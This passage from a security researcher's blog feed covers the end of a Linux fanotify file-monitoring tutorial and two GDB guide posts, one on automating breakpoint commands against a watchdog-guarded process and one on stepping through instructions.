</span></span></code></pre></div><p>After getting a valid fanotify file descriptor (not -1), we can mark a file/directory/mount point. In this example, I will just be marking the &ldquo;/&rdquo; mount point with <code>FAN_MARK_FILESYSTEM</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">uint64_t</span> masks <span style="color:#f92672">=</span> FAN_ONDIR <span style="color:#f92672">|</span> \
</span></span><span style="display:flex;"><span>                 <span style="color:#75715e">/* All subsequent masks only from Linux 5.1 onwards */</span>
</span></span><span style="display:flex;"><span>                 FAN_CREATE <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">\</span> 
</span></span><span style="display:flex;"><span>                 FAN_DELETE <span style="color:#f92672">|</span> \
</span></span><span style="display:flex;"><span>                 FAN_MOVED_FROM <span style="color:#f92672">|</span> \
</span></span><span style="display:flex;"><span>                 FAN_MOVED_TO;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fanotify_mark</span>(fan_fd, FAN_MARK_ADD <span style="color:#f92672">|</span> FAN_MARK_FIOLESYSTEM, masks, AT_FDCWD, <span style="color:#e6db74">&#34;/&#34;</span>);
</span></span></code></pre></div><link href="/posts/css/alert.css" rel="stylesheet">
<div class="alert warning">
    <div class="alert-content">
        <div class="alert-header">
            <span class="alert-icon"></span>
            <strong class="alert-title">Warning</strong>
        </div>
        <div class="alert-body"><ul>
<li>Do note that older kernels (&lt; 4.20) will not be able to use this feature, and hence will not be able to monitor for create, delete and move events.</li>
<li>Cannot use <code>FAN_MARK_MOUNT</code> for a file descriptor that uses <code>FAN_CLASS_NOTIF | FAN_REPORT_DFID_NAME</code>.</li>
</ul>
</div>
    </div>
</div>

<p>Similarly, we will do a <em>poll()</em> on the fanotify file descriptor just like how we did it in the <a href="/posts/linux-file-monitoring-with-fanotify/#4-inspecting-read-write-execute-events">previous section</a>. If you want to get the file name, you will need to make use of <code>struct fanotify_event_info_fid</code> and <code>struct file_handle</code>.</p>
<p>The snippet below shows how you are able to retrieve the file name:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> fanotify_event_metadata <span style="color:#f92672">*</span>metadata;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> fanotify_event_info_fid <span style="color:#f92672">*</span>fid;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>file_name <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">FAN_EVENT_OK</span>(metadata, buflen)) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  fid <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> fanotify_event_info_fid <span style="color:#f92672">*</span>) (metadata <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  file_handle <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> file_handle <span style="color:#f92672">*</span>) fid<span style="color:#f92672">-&gt;</span>handle;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (fid<span style="color:#f92672">-&gt;</span>hdr.info_type <span style="color:#f92672">==</span> FAN_EVENT_INFO_TYPE_FID <span style="color:#f92672">||</span> fid<span style="color:#f92672">-&gt;</span>hdr.info_type <span style="color:#f92672">==</span> FAN_EVENT_INFO_TYPE_DFID) {
</span></span><span style="display:flex;"><span>      file_name <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (fid<span style="color:#f92672">-&gt;</span>hdr.info_type <span style="color:#f92672">==</span> FAN_EVENT_INFO_TYPE_DFID_NAME) {
</span></span><span style="display:flex;"><span>      file_name <span style="color:#f92672">=</span> file_handle<span style="color:#f92672">-&gt;</span>f_handle <span style="color:#f92672">+</span> file_handle<span style="color:#f92672">-&gt;</span>handle_bytes;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><h2 id="6--bonus---allowdeny-file-operations">6. ⭐ Bonus - Allow/Deny File Operations</h2>
<p>If you are creating an application that prevents all users (including root) to read or execute certain files, you will need the same <a href="/posts/linux-file-monitoring-with-fanotify/#flags">flags</a> as the <em>fanotify_init()</em> example shown in Section 4. After getting a valid fanotify file descriptor (not -1), we can mark a file/directory/mount point.</p>
<p>In this example, I will be marking just 1 file - &ldquo;/home/gerald/example.txt&rdquo; and deny any who tries to open this file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> fanotify_response response;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fanotify_mark</span>(fan_fd, FAN_MARK_ADD, FAN_OPEN_PERM, AT_FDCWD, <span style="color:#e6db74">&#34;/home/gerald/example.txt&#34;</span>);
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">FAN_EVENT_OK</span>(metadata, buflen)) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (metadata<span style="color:#f92672">-&gt;</span>mask <span style="color:#f92672">&amp;</span> FAN_OPEN_PERM) {
</span></span><span style="display:flex;"><span>    response.fd <span style="color:#f92672">=</span> metadata<span style="color:#f92672">-&gt;</span>fd;
</span></span><span style="display:flex;"><span>    response.response <span style="color:#f92672">=</span> FAN_DENY;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(fan_fd, <span style="color:#f92672">&amp;</span>response, <span style="color:#66d9ef">sizeof</span>(response));
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// next event
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">close</span>(metadata<span style="color:#f92672">-&gt;</span>fd);
</span></span><span style="display:flex;"><span>  metadata <span style="color:#f92672">=</span> <span style="color:#a6e22e">FAN_EVENT_NEXT</span>(metadata, buflen);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><h2 id="7-conclusion">7. Conclusion</h2>
<p>If everything made sense to you so far, great! If not, I would highly recommend re-visiting the sections you were unsure on, and trying the fanotify APIs for yourself!</p>
<h2 id="8-resources">8. Resources</h2>
<ol>
<li><a href="https://github.com/mathscantor/filemon">filemon</a> - Multithreaded Linux File Monitoring Tool</li>
<li><a href="https://man7.org/linux/man-pages/man7/fanotify.7.html">fanotify(7) man page</a> - Official fanotify man page</li>
<li><a href="https://man7.org/linux/man-pages/man2/fanotify_init.2.html">fanotify_init(2) man page</a> - Official fanotify_init man page</li>
<li><a href="https://man7.org/linux/man-pages/man2/fanotify_mark.2.html">fanotify_mark(2) man page</a> - Official fanotify_mark man page</li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>GDB Guide Part 6 - Automation</title>
            <link>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part6-automation/</link>
            <pubDate>Sat, 01 Mar 2025 09:09:02 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part6-automation/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;Now that we have more or less grasp most of the basics commands in GDB, it is time to start automating all these commands.
Most of the time in my research, watch dog processes will monitor the performance of our target processes very closely. Any performance degradation
will usually lead to the process getting killed or the entire VM getting restarted. This means that if you use interactive GDB and take your
sweet time to type out the commands, the process would have held its funeral before you can even type out your 5th command.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>Now that we have more or less grasp most of the basics commands in GDB, it is time to start automating all these commands.
Most of the time in my research, watch dog processes will monitor the performance of our target processes very closely. Any performance degradation
will usually lead to the process getting killed or the entire VM getting restarted. This means that if you use interactive GDB and take your
sweet time to type out the commands, the process would have held its funeral before you can even type out your 5th command.</p>
<p>At this point you may ask, &ldquo;If we can debug processes, doesn&rsquo;t that mean we are already root, and we control the VM?&rdquo;. Unfortunately, we often share
test beds with other researchers, and we have to be careful how we debug processes, as it can be very disruptive for other people.</p>
<h2 id="2-test-program">2. Test Program</h2>
<p>To make you appreciate this tutorial better, I generated a test program using ChatGPT to create a watchdog and a watched child process.
In the video below, I demonstrated that the moment the watched process&rsquo;s execution is paused, it will be killed by the watchdog.</p>
<p>
 
<video width=100% controls>
    <source src="/posts/gdb-guides/gdb-guide-part6-automation/videos/watchdog-kills-process.webm" type="video/webm">
    Your browser does not support the video tag.  
</video>

<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="video">Demo - Watchdog Kills Unresponsive Watched Process<br><br></span></p>
<p>It is recommended to get the <a href="/posts/gdb-guides/gdb-guide-part6-automation/resources/automation-exercise.c">source file</a> or the <a href="/posts/gdb-guides/gdb-guide-part6-automation/resources/automation-exercise">static binary</a> to follow along from this section onwards.</p>
<h2 id="3-assigning-commands-to-breakpoints">3. Assigning Commands to Breakpoints</h2>
<p>To assign a set of commands to any breakpoint, use <code>commands</code>.
According to the GDB manual:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>(gdb) help commands
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Set commands to be executed when the given breakpoints are hit.
</span></span><span style="display:flex;"><span>Give a space<span style="color:#f92672">-</span>separated breakpoint list as argument after <span style="color:#e6db74">&#34;commands&#34;</span>.
</span></span><span style="display:flex;"><span>A list element can be a breakpoint <span style="color:#a6e22e">number</span> (e.g. <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">&#39;</span>) or a range of <span style="color:#a6e22e">numbers</span>
</span></span><span style="display:flex;"><span>(e.g. <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">&#39;</span>).
</span></span><span style="display:flex;"><span>With no argument, the targeted breakpoint is the last one set.
</span></span><span style="display:flex;"><span>The commands themselves follow starting on the next line.
</span></span><span style="display:flex;"><span>Type a line containing <span style="color:#e6db74">&#34;end&#34;</span> to indicate the end of them.
</span></span><span style="display:flex;"><span>Give <span style="color:#e6db74">&#34;silent&#34;</span> as the first line to make the breakpoint silent;
</span></span><span style="display:flex;"><span>then no output is printed when it is hit, except what the commands print.
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Commands Usage<br><br></span>
<p>Let&rsquo;s test this out in practice by inspecting 3 arguments supplied to the <em>write</em> function call.
To do so, we will write all our commands into a GDB script, called automation-exercise.gdb.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set pag off
</span></span><span style="display:flex;"><span>set output-radix <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>set confirm off
</span></span><span style="display:flex;"><span>set disassembly-flavor intel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>b write
</span></span><span style="display:flex;"><span>commands
</span></span><span style="display:flex;"><span>  info registers rdi rsi rdx
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>end
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># After setting the breakpoint and  commands, resume the process.</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">continue</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">GDB Script - automation-exercise.gdb<br><br></span>
<p>In order to attach to the process and run the commands from our file, we need to supply our GDB command with <code>--batch</code> and <code>-x</code> arguments.</p>
<link href="/posts/css/alert.css" rel="stylesheet">
<div class="alert note">
    <div class="alert-content">
        <div class="alert-header">
            <span class="alert-icon"></span>
            <strong class="alert-title">Note</strong>
        </div>
        <div class="alert-body"><p><code>--batch</code></p>
<ul>
<li>Run  in  batch  mode.  Exit with status 0 after processing all the  command files specified with -x (and .gdbinit, if not inhibited).  Exit  with  nonzero status if an error occurs in executing the GDB commands in the command files.</li>
</ul>
<p><code>-x file</code></p>
<ul>
<li>Execute GDB commands from file.</li>
</ul>
</div>
    </div>
</div>

<p>Thus, our GDB arguments will look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb --batch -x automation-exercise.gdb -p $PID
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Attaching GDB to Process with Script<br><br></span>
<p>
 
<video width=100% controls>
    <source src="/posts/gdb-guides/gdb-guide-part6-automation/videos/breakpoint-write-commands-info-registers.webm" type="video/webm">
    Your browser does not support the video tag.  
</video>

<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="video">Demo - Automating the GDB Commands on <em>write()</em> Function Calls<br><br></span></p>
<p>Just for practice, edit the above GDB script to only print out messages sent from the child process to the watchdog.
As a start, you need to find out which argument is the one that contains the buffer. You can also filter out irrelevant write calls by
the file descriptor. Since we do not want <em>write()</em> calls from <em>printf()</em>, filter out <em>write()</em> calls whose file descriptor is 1 (stdout fd is 1).</p>
<p>If you have done everything right, your output will look something similar to the example shown below.</p>
<p>
 
<video width=100% controls>
    <source src="/posts/gdb-guides/gdb-guide-part6-automation/videos/extra-exercise.webm" type="video/webm">
    Your browser does not support the video tag.  
</video>

<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="video">Demo - Extra Exercise Answer<br><br></span></p>
<p>If you still cannot figure it out, that&rsquo;s alright. Here&rsquo;s the <a href="/posts/gdb-guides/gdb-guide-part6-automation/resources/automation-exercise-extras.gdb">answer</a> to the extra exercise.</p>
<h2 id="4-conclusion">4. Conclusion</h2>
<p>After today&rsquo;s exercise, I hope you have gained more confidence in debugging targets that cannot have their executions paused indefinitely. In the next post, I will be sharing more about more automation techinques by defining your own custom commands.</p>
<h2 id="5-resources">5. Resources</h2>
<ol>
<li><a href="/posts/gdb-guides/gdb-guide-part6-automation/resources/automation-exercise.c">automation-exercise.c</a></li>
<li><a href="/posts/gdb-guides/gdb-guide-part6-automation/resources/automation-exercise">automation-exercise</a></li>
<li><a href="/posts/gdb-guides/gdb-guide-part6-automation/resources/automation-exercise.gdb">automation-exercise.gdb</a></li>
<li><a href="/posts/gdb-guides/gdb-guide-part6-automation/resources/automation-exercise-extras.gdb">automation-exercise-extras.gdb</a></li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>GDB Guide Part 5 - Stepping</title>
            <link>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part5-stepping/</link>
            <pubDate>Sun, 23 Feb 2025 13:08:30 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part5-stepping/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;This part of the guide will demonstrate to you the differences between stepping in, over and out.
In most cases while doing cyber security research, we will not have access to symbols and source code. Thus, the examples
I provide will only be for stepping through instructions and not source lines.&lt;/p&gt;
&lt;h2 id=&#34;2-example-program&#34;&gt;2. Example Program&lt;/h2&gt;
&lt;p&gt;For this part of the tutorial, either compile &lt;a href=&#34;https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part5-stepping/resources/stepping-exercise.c&#34;&gt;stepping-exercise.c&lt;/a&gt; or download the static binary &lt;a href=&#34;https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part5-stepping/resources/stepping-exercise&#34;&gt;stepping-exercise&lt;/a&gt; to follow along.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>This part of the guide will demonstrate to you the differences between stepping in, over and out.
In most cases while doing cyber security research, we will not have access to symbols and source code. Thus, the examples
I provide will only be for stepping through instructions and not source lines.</p>
<h2 id="2-example-program">2. Example Program</h2>
<p>For this part of the tutorial, either compile <a href="/posts/gdb-guides/gdb-guide-part5-stepping/resources/stepping-exercise.c">stepping-exercise.c</a> or download the static binary <a href="/posts/gdb-guides/gdb-guide-part5-stepping/resources/stepping-exercise">stepping-exercise</a> to follow along.</p>
<h2 id="3-stepping-in">3. Stepping In</h2>
<p>To step through one instruction at a time, the command to use will be <code>stepi / si</code>.
For more information, see the help usage of <code>stepi / si</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> help si
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>stepi, si
</span></span><span style="display:flex;"><span>Step one instruction exactly.
</span></span><span style="display:flex;"><span>Usage: stepi <span style="color:#f92672">[</span>N<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Argument N means step N times <span style="color:#f92672">(</span>or till program stops <span style="color:#66d9ef">for</span> another reason<span style="color:#f92672">)</span>.
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Step-Into Usage<br><br></span>
<p>The following example shows the relevant commands for stepping into 5 instructions after we hit the breakpoint at the start of <em>fib_num()</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set pag off
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set disassembly-flavor intel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b fib_num
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x4018bd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Run the program and enter any number</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r
</span></span><span style="display:flex;"><span>Enter Fibonacci Sequence: <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Breakpoint 1, 0x00000000004018bd in fib_num <span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inspect 10 instructions from the current instruction</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/10i $pc
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; 0x4018bd &lt;fib_num+8&gt;:        mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0x14<span style="color:#f92672">]</span>,edi
</span></span><span style="display:flex;"><span>   0x4018c0 &lt;fib_num+11&gt;:       mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0x10<span style="color:#f92672">]</span>,0x0
</span></span><span style="display:flex;"><span>   0x4018c7 &lt;fib_num+18&gt;:       mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0xc<span style="color:#f92672">]</span>,0x1
</span></span><span style="display:flex;"><span>   0x4018ce &lt;fib_num+25&gt;:       mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0x8<span style="color:#f92672">]</span>,0x0
</span></span><span style="display:flex;"><span>   0x4018d5 &lt;fib_num+32&gt;:       cmp    DWORD PTR <span style="color:#f92672">[</span>rbp-0x14<span style="color:#f92672">]</span>,0x0
</span></span><span style="display:flex;"><span>   0x4018d9 &lt;fib_num+36&gt;:       jne    0x4018e0 &lt;fib_num+43&gt;
</span></span><span style="display:flex;"><span>   0x4018db &lt;fib_num+38&gt;:       mov    eax,DWORD PTR <span style="color:#f92672">[</span>rbp-0x10<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>   0x4018de &lt;fib_num+41&gt;:       jmp    0x40191a &lt;fib_num+101&gt;
</span></span><span style="display:flex;"><span>   0x4018e0 &lt;fib_num+43&gt;:       cmp    DWORD PTR <span style="color:#f92672">[</span>rbp-0x14<span style="color:#f92672">]</span>,0x1
</span></span><span style="display:flex;"><span>   0x4018e4 &lt;fib_num+47&gt;:       jne    0x4018eb &lt;fib_num+54&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step into 5 instructions</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> si <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>0x00000000004018d9 in fib_num <span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inspect the current instruction</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/i $pc
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; 0x4018d9 &lt;fib_num+36&gt;:       jne    0x4018e0 &lt;fib_num+43&gt;
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Example Usage of Stepping Into<br><br></span>
<h2 id="4-stepping-over">4. Stepping Over</h2>
<p>Stepping over is slightly different from stepping as it treats a function/subroutine call as one instruction. To step over instructions, the command to use is <code>nexti / ni</code>.
To see more information on <code>nexti / ni</code>, refer to the help usage.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> help ni
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nexti, ni
</span></span><span style="display:flex;"><span>Step one instruction, but proceed through subroutine calls.
</span></span><span style="display:flex;"><span>Usage: nexti <span style="color:#f92672">[</span>N<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Argument N means step N times <span style="color:#f92672">(</span>or till program stops <span style="color:#66d9ef">for</span> another reason<span style="color:#f92672">)</span>.
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Step-Over Usage<br><br></span>
<p>The following example shows the relevant commands for stepping over the fib_num call after we hit the breakpoint at the function call to <em>fib_num()</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set pag off
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set disassembly-flavor intel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Diassemble main to find the offset of the call to fib_num()</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disass main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
</span></span><span style="display:flex;"><span>   ...
</span></span><span style="display:flex;"><span>   0x0000000000401959 &lt;+61&gt;:    mov    rdi,rax
</span></span><span style="display:flex;"><span>   0x000000000040195c &lt;+64&gt;:    mov    eax,0x0
</span></span><span style="display:flex;"><span>   0x0000000000401961 &lt;+69&gt;:    call   0x404e00 &lt;__isoc99_scanf&gt;
</span></span><span style="display:flex;"><span>   0x0000000000401966 &lt;+74&gt;:    mov    eax,DWORD PTR <span style="color:#f92672">[</span>rbp-0xc<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>   0x0000000000401969 &lt;+77&gt;:    mov    edi,eax
</span></span><span style="display:flex;"><span>   0x000000000040196b &lt;+79&gt;:    call   0x4018b5 &lt;fib_num&gt;
</span></span><span style="display:flex;"><span>   0x0000000000401970 &lt;+84&gt;:    mov    esi,eax
</span></span><span style="display:flex;"><span>   ...
</span></span><span style="display:flex;"><span>End of assembler dump.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set a breakpoint at the call instruction</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b *<span style="color:#f92672">(</span>main + 79<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x40196b
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Run the program and enter any number</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r
</span></span><span style="display:flex;"><span>Enter Fibonacci Sequence: <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Breakpoint 1, 0x000000000040196b in main <span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inspect 5 instructions from the current instruction</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/5i $pc
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; 0x40196b &lt;main+79&gt;:  call   0x4018b5 &lt;fib_num&gt;
</span></span><span style="display:flex;"><span>   0x401970 &lt;main+84&gt;:  mov    esi,eax
</span></span><span style="display:flex;"><span>   0x401972 &lt;main+86&gt;:  lea    rax,<span style="color:#f92672">[</span>rip+0x9b6d1<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x49d04a</span>
</span></span><span style="display:flex;"><span>   0x401979 &lt;main+93&gt;:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   0x40197c &lt;main+96&gt;:  mov    eax,0x0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step over once</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> ni
</span></span><span style="display:flex;"><span>0x0000000000401970 in main <span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Current instruction is after fib_num() call.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/i $pc
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; 0x401970 &lt;main+84&gt;:  mov    esi,eax
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Example Usage of Stepping Over<br><br></span>
<h2 id="5-stepping-out">5. Stepping Out</h2>
<p>The last method of stepping is to execute everything in the current function and return to the caller. To do so, use the
<code>finish</code> command. To see more information on <code>finish</code>, refer to the help usage.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> help finish
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>finish, fin
</span></span><span style="display:flex;"><span>Execute <span style="color:#66d9ef">until</span> selected stack frame returns.
</span></span><span style="display:flex;"><span>Usage: finish
</span></span><span style="display:flex;"><span>Upon <span style="color:#66d9ef">return</span>, the value returned is printed and put in the value history.
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Step-Out Usage<br><br></span>
<p>The following example shows the relevant commands for stepping out of the <em>fib_num()</em> function and getting its return value.
The</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set pag off
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set disassembly-flavor intel
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b fib_num
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x4018bd
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r
</span></span><span style="display:flex;"><span>Starting program: /home/gerald/Desktop/Repositories/hugo-blog/staging.mathscantor.github.io/static/posts/gdb-guides/gdb-guide-part5-stepping/resources/stepping-exercise 
</span></span><span style="display:flex;"><span>Enter Fibonacci Sequence: <span style="color:#ae81ff">10</span>
